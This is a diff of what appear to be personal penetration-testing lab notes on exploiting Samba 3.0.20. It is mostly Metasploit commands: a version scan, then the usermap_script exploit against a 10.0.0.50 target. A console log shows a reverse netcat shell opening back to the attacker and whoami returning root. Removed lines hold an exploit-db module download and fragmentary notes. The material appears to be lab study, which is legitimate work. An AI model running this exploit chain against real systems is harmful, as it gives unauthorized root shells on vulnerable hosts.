@@ -156,37 +156,22 @@ whoami
 root
 ```
 
-## Attempt 2: Samba smbd 3.X - 4.X
+## Attempt 2: Samba smbd 3.X - 4.X (the target machine's ip has changed to 10.0.0.50 in this attempt)
 
 ```bash
 use auxiliary/scanner/smb/smb_version
-set RHOSTS 192.168.56.3
-set RPORT 139
-run
+set RHOSTS 10.0.0.50
+# 445 and 139 both work, default is 445
+set RPORT 445
+run 
 # obtain version: Samba 3.0.20-Debian
 
-msf auxiliary(scanner/smb/smb_version) > search Samba 3.0.20
+search Samba 3.0.20
 use exploit/multi/samba/usermap_script
-set RHOSTS 192.168.56.3
-set RPORT 445
+set RHOSTS 10.0.0.50
+# 445 and 139 both work, default is 139
+set RPORT 139
 run
-
-# Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)
-wget https://www.exploit-db.com/download/42084
-
-sudo mv 42084.rb /usr/share/metasploit-framework/modules/exploits/custom/
-use auxiliary/scanner/smb/smb_version
-
-set RHOSTS 192.168.56.3
-set RPORT 
-Exploit to get the full-version
-
-use exploit/multi/samba/usermap_script
-
-set RHOSTS to target ip
-
-Exploit
-
 ```
 
 ```log
@@ -213,4 +198,14 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
 
+
+msf > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf exploit(multi/samba/usermap_script) > set RHOSTS 10.0.0.50
+RHOSTS => 10.0.0.50
+msf exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] Command shell session 1 opened (10.0.0.102:4444 -> 10.0.0.50:54739) at 2025-12-09 14:27:40 +0800
+whoami
+root
 ```
